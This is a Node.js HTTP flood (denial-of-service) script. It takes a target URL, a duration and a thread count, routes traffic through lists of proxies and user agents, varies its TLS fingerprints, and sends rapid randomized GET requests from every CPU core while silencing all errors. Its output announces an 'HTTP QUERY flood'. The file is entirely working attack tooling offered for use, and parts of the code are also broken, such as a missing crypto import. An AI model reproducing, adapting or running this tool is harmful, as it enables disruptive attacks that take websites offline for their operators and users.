const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var colors = require('colors');
var theJar = request_2.jar();
const path = require("path");
const { cpus } = require('os');
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;
const cluster = require('cluster');

// Новые параметры TLS
const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256"
];

const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256"];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions =
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.SSL_OP_NO_TLSv1_3 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";

//Coming soon...
var cookies = {};

var VarsDefinetions = {
Objetive: process.argv[2],
time: process.argv[3],
rate:process.argv[4]
}

if (process.argv.length !== 5) {
    console.log(`                       
Usage: node ${path.basename(__filename)} <Target> <Time> <Threads>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <30>
------------------------------------------------------------------
Dependencies: user-agents.txt (User Agents) | proxies.txt (Proxies)
`);
    process.exit(0);
}

var fileName = __filename;
var file = path.basename(fileName);

var proxies = fs.readFileSync('proxies.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
var UAs = fs.readFileSync('user-agents.txt', 'utf-8').replace(/\r/g, '').split('\n');

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';

const numCPUs = cpus().length;
if (cluster.isPrimary) {

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
  });
} else {

function BuildRequest() {
let path = parsed.path;
if (path.indexOf("[rand]") !== -1){
    path = path.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,16)));
}
var raw_socket = 'GET' + ' ' + path + '?query=' + RandomString(getRandomNumberBetween(1,24)) + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
return raw_socket;
}

setInterval(function() {

var getrandprxy = getRandomNumberBetween(100, proxies.length-2000);

var proxy = proxies[Math.floor(Math.random() * getrandprxy)];
proxy = proxy.split(':');

const agent = new http.Agent({
keepAlive: true,
keepAliveMsecs: 50000,
maxSockets: Infinity,
});

var tlsSessionStore = {};

var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'keep-alive',
    'Connection': 'keep-alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ 
    req.setSocketKeepAlive(true);
 });

req.on('connect', function (res, socket, head) {
    tls.authorized = true;
    tls.sync = true;
    
    var cipper = cplist[Math.floor(Math.random() * cplist.length)];
    
    // Создаем secureContext
    const secureContext = tls.createSecureContext({
        ciphers: cipper,
        sigalgs: SignalsList,
        secureOptions: secureOptions,
        secureProtocol: secureProtocol
    });

    // Новые TLS опции
    const tlsOptions = {
        port: 443,
        secure: true,
        ALPNProtocols: ["h2"],
        ciphers: cipper,
        sigalgs: sigalgs,
        requestCert: true,
        socket: socket,
        ecdhCurve: ecdhCurve,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext: secureContext,
        host: parsed.host,
        servername: parsed.host,
        secureProtocol: secureProtocol
    };
    
    var TlsConnection = tls.connect(tlsOptions, function () {

for (let j = 0; j < VarsDefinetions.rate; j++) {

TlsConnection.setKeepAlive(true, 600000);
TlsConnection.setNoDelay(true);
TlsConnection.setTimeout(10000);
TlsConnection.allowHalfOpen = true;
TlsConnection.setMaxListeners(0);
var r = BuildRequest();
TlsConnection.write(r);
}
});

TlsConnection.on('disconnected', () => {
    TlsConnection.destroy();
});

TlsConnection.on('timeout' , () => {
    TlsConnection.destroy();
});

TlsConnection.on('error', (err) =>{
    TlsConnection.destroy();
});

TlsConnection.on('data', (chunk) => {
    setTimeout(function () { 
        TlsConnection.abort(); 
        return delete TlsConnection
    }, 10000); 
});

TlsConnection.on('end', () => {
  TlsConnection.abort();
  TlsConnection.destroy();
});

}).end()
}, 0);
}

setTimeout(() => {
    console.log('\nHTTP QUERY flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
  process.exit(1);
}, VarsDefinetions.time*1000)